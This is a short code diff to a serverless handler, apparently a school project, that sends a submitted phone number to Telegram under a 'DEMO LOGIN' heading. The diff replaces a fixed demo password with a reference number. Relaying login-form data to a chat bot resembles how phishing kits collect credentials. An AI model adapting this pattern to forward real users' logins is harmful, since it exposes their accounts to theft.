@@ -28,7 +28,7 @@ export default async function handler(req, res) {
   const telegramMessage =
     "SCHOOL PROJECT - DEMO LOGIN\n\n" +
     "Phone: " + phone + "\n" +
-    "Password: DEMO1234\n" +
+    "Reference: REF-82941\n" +
     "Status: Test submission received";
 
   try {
